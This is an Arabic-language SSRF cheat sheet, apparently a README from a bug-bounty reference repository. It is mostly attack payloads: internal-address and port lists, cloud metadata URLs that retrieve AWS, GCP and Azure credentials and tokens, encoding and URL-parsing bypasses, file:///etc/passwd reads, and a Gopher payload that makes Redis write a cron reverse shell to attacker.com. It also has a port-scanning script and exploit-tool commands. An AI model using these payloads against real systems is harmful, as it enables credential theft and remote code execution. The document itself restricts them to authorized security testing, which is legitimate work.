<a id="-ssrf---server-side-request-forgery"></a>
# 🌐 SSRF - تزوير الطلبات من جانب الخادم

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗███████╗██████╗ ███████╗
  ██╔════╝██╔════╝██╔══██╗██╔════╝
  ███████╗███████╗██████╔╝█████╗  
  ╚════██║╚════██║██╔══██╗██╔══╝  
  ███████║███████║██║  ██║██║     
  ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
   Server-Side Request Forgery
```

> الرسم النصي أعلاه يختصر اسم الثغرة بالإنجليزية؛ المقصود هو تزوير الطلبات التي يرسلها الخادم (SSRF).

<p align="center">
  <img src="https://img.shields.io/badge/SSRF-Internal_Access-red?style=for-the-badge" alt="SSRF">
  <img src="https://img.shields.io/badge/Cloud-Metadata-blue?style=for-the-badge" alt="Cloud">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

<a id="-what-is-ssrf"></a>
## 🎯 ما هو SSRF

تتيح ثغرة **SSRF** للمهاجم دفع الخادم إلى إرسال طلبات إلى وجهات غير مقصودة، مما قد يسمح بالوصول إلى خدمات داخلية أو بيانات وصفية للبيئة السحابية (Cloud metadata).

<a id="impact"></a>
### الأثر
- 🔴 **الوصول إلى الشبكة الداخلية** - فحص الخدمات الداخلية
- 🔴 **البيانات الوصفية السحابية** - سرقة بيانات اعتماد AWS/GCP
- 🔴 **تجاوز جدران الحماية** - الوصول إلى موارد محمية
- 🔴 **RCE** - قد تؤدي في بعض الحالات إلى تنفيذ الشيفرة عن بُعد

---

<a id="-where-to-look"></a>
## 🔍 أين تبحث

<a id="common-parameters"></a>
### المعاملات الشائعة
```
url=
uri=
path=
dest=
redirect=
redirect_uri=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```

<a id="common-vulnerable-functions"></a>
### وظائف شائعة قد تكون عرضة للثغرة
```
- أدوات جلب عناوين URL أو التحقق منها
- مولّدات ملفات PDF
- معالجات الصور
- عمليات استيراد الملفات
- الاستدعاءات الراجعة عبر الويب (Webhooks)
- عمليات التكامل مع واجهات API
- أدوات استخلاص محتوى الويب
- خدمات التقاط صور الصفحات
```

---

<a id="-basic-payloads"></a>
## 💉 حمولات أساسية

<a id="localhost"></a>
### المضيف المحلي (Localhost)
```
http://localhost
http://localhost:80
http://localhost:443
http://localhost:22
http://127.0.0.1
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
```

<a id="internal-networks"></a>
### الشبكات الداخلية
```
# الفئة A
http://10.0.0.1
http://10.10.10.10
http://10.255.255.255

# الفئة B
http://172.16.0.1
http://172.31.255.255

# الفئة C
http://192.168.0.1
http://192.168.1.1
http://192.168.255.255

# عنوان محلي للرابط (Link-local)
http://169.254.169.254
```

<a id="common-ports"></a>
### المنافذ الشائعة
```
http://127.0.0.1:21    # FTP
http://127.0.0.1:22    # SSH
http://127.0.0.1:23    # Telnet
http://127.0.0.1:25    # SMTP
http://127.0.0.1:80    # HTTP
http://127.0.0.1:443   # HTTPS
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:27017 # MongoDB
http://127.0.0.1:8080  # منفذ HTTP بديل
http://127.0.0.1:9200  # Elasticsearch
```

---

<a id="-cloud-metadata"></a>
## ☁️ البيانات الوصفية السحابية

<a id="aws"></a>
### AWS
```
# البيانات الوصفية للمثيل (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# بيانات محددة
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
```

> **توضيح للإصدارات:** عناوين AWS السابقة تخص IMDSv1. عند اشتراط IMDSv2 لا تكفي طلبات GET بلا رمز؛ يلزم أولًا رمز جلسة يُطلب باستخدام PUT ثم يُضمّن في طلبات البيانات الوصفية. [توثيق AWS الرسمي](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).

<a id="google-cloud-gcp"></a>
### منصة Google Cloud ‏(GCP)
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# مع الترويسة المطلوبة
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

<a id="azure"></a>
### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# يتطلب ترويسة
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

<a id="digitalocean"></a>
### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
```

---

<a id="-bypass-techniques"></a>
## 🛡️ تقنيات التجاوز

<a id="ip-address-formats"></a>
### صيغ عناوين IP
```
# عشري
http://2130706433  # = 127.0.0.1
http://3232235521  # = 192.168.0.1

# ست عشري
http://0x7f000001  # = 127.0.0.1
http://0x7f.0x0.0x0.0x1

# ثماني
http://0177.0.0.01  # = 127.0.0.1
http://0177.0.0.0

# صيغ مختلطة
http://127.1
http://127.0.1
http://0
```

<a id="url-encoding"></a>
### ترميز URL
```
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74

# ترميز مزدوج
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34
```

<a id="dns-rebinding"></a>
### إعادة ربط DNS ‏(DNS Rebinding)
```
# استخدام خدمات مثل:
# - spoofed.burpcollaborator.net
# - 7f000001.rbndr.us  → 127.0.0.1
# - 1.localtest.me → 127.0.0.1

# إعداد DNS مخصص
your-domain.com → 127.0.0.1
```

<a id="url-parsing-issues"></a>
### مشكلات تحليل URL
```
# حيلة @
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1?@attacker.com
http://attacker.com\@127.0.0.1

# أجزاء URL بعد العلامة #
http://127.0.0.1#.attacker.com
http://127.0.0.1?.attacker.com

# الشرطة المائلة العكسية
http://attacker.com\127.0.0.1
```

<a id="protocol-smuggling"></a>
### تمرير بروتوكولات بديلة (Protocol Smuggling)
```
# ملف
file:///etc/passwd
file://127.0.0.1/etc/passwd

# Gopher
gopher://127.0.0.1:6379/_INFO

# Dict
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389

# TFTP
tftp://127.0.0.1/file.txt
```

<a id="open-redirect-chain"></a>
### سلسلة إعادة توجيه مفتوحة
```
# إذا كان الموقع يحتوي على إعادة توجيه مفتوحة:
https://target.com/redirect?url=http://169.254.169.254/

# إعادة التوجيه إلى وجهة داخلية
http://target.com/redirect?url=http://127.0.0.1:8080
```

<a id="ipv6-bypass"></a>
### التجاوز باستخدام IPv6
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
http://[::]
```

<a id="header-injection"></a>
### حقن الترويسات
```
# حقن محرفَي CRLF في URL
http://attacker.com%0d%0aHost:%20127.0.0.1%0d%0a
```

---

<a id="-exploitation"></a>
## 🔥 الاستغلال

<a id="redis-rce-via-gopher"></a>
### تنفيذ شيفرة عن بُعد في Redis عبر Gopher
```
# توليد الحمولة
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a
*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1
%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

<a id="http-request-smuggling"></a>
### تهريب طلبات HTTP ‏(HTTP Request Smuggling)
```
gopher://127.0.0.1:80/_POST%20/internal/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2020%0d%0a%0d%0acommand=id
```

> **تصحيح للتسمية:** المثال السابق ينشئ طلب HTTP داخليًا عبر Gopher؛ وجوده وحده لا يثبت ثغرة تهريب طلبات HTTP، التي تعتمد على اختلاف تفسير حدود الطلبات بين مكوّنات HTTP. كذلك فإن طول جسم الطلب المعلن في المثال هو 20، بينما النص المعروض `command=id` طوله 10 بايتات؛ بقي المثال كما في المصدر. [شرح PortSwigger](https://portswigger.net/web-security/request-smuggling).

<a id="port-scanning"></a>
### فحص المنافذ
```python
import requests

target = "https://vulnerable.com/fetch?url="
ports = [21, 22, 23, 25, 80, 443, 3306, 6379, 8080]

for port in ports:
    url = f"{target}http://127.0.0.1:{port}"
    r = requests.get(url, timeout=5)
    if "connection refused" not in r.text.lower():
        print(f"[OPEN] Port {port}")
```

> **تنبيه تفسيري:** السكربت السابق يعتمد على غياب عبارة خطأ واحدة لتسمية المنفذ مفتوحًا؛ هذه قرينة تقريبية وليست إثباتًا، كما لا يعالج استثناءات الاتصال أو انتهاء المهلة.

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="detection"></a>
### الكشف
```
# اختبار وجود SSRF
?url=http://burpcollaborator.net
?url=http://webhook.site/xxxx

# فحص الاستجابة
- هل وصل استعلام DNS؟
- هل وصل طلب HTTP؟
- هل تختلف الاستجابة عند استخدام عناوين IP داخلية؟
```

<a id="impact-levels"></a>
### مستويات الأثر

| الهدف | الأثر |
|--------|--------|
| البيانات الوصفية السحابية | حرج - سرقة بيانات الاعتماد |
| واجهات API داخلية | مرتفع - الوصول إلى البيانات |
| خدمات داخلية | مرتفع - احتمال تنفيذ شيفرة عن بُعد |
| فحص المنافذ | متوسط - كشف المعلومات |

<a id="common-filters--bypasses"></a>
### المرشحات الشائعة وطرق تجاوزها

| المرشح | التجاوز |
|--------|--------|
| حظر `localhost` | استخدام `127.0.0.1`, `0`, `[::1]` |
| حظر `127.0.0.1` | استخدام الصيغة العشرية `2130706433` |
| حظر عناوين IP الخاصة | استخدام إعادة ربط DNS |
| السماح بـ HTTP فقط | تجربة `gopher://`, `file://` |
| قائمة سماح للنطاقات | استخدام حيلة `@` أو إعادة التوجيه المفتوحة |

> **حدود الأمثلة:** صيغ العناوين البديلة وطرق التجاوز تعتمد على محلّل URL وعميل الشبكة وإعداداتهما. لا يتجاوز بروتوكول بديل سياسةً تطبّق السماح بـ HTTP تطبيقًا صحيحًا؛ كما أن إرسال HTTP إلى منفذ خدمة أخرى لا يحوّل الطلب تلقائيًا إلى بروتوكول تلك الخدمة.

---

<a id="-tools"></a>
## 🛠️ أدوات

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Gopherus (مولّد حمولات Gopher)
python gopherus.py --exploit redis

# Collaborator أو Webhook لاختبار SSRF الأعمى
# - Burp Collaborator
# - webhook.site
# - requestbin.com
```

---

<a id="-resources"></a>
## 📚 مصادر

- [مرجع SSRF من PortSwigger](https://portswigger.net/web-security/ssrf)
- [دليل منع SSRF من OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

<p align="center">
  <b>🌐 استكشاف استغلال SSRF!</b><br>
  <i>للاختبارات المصرّح بها فقط!</i>
</p>
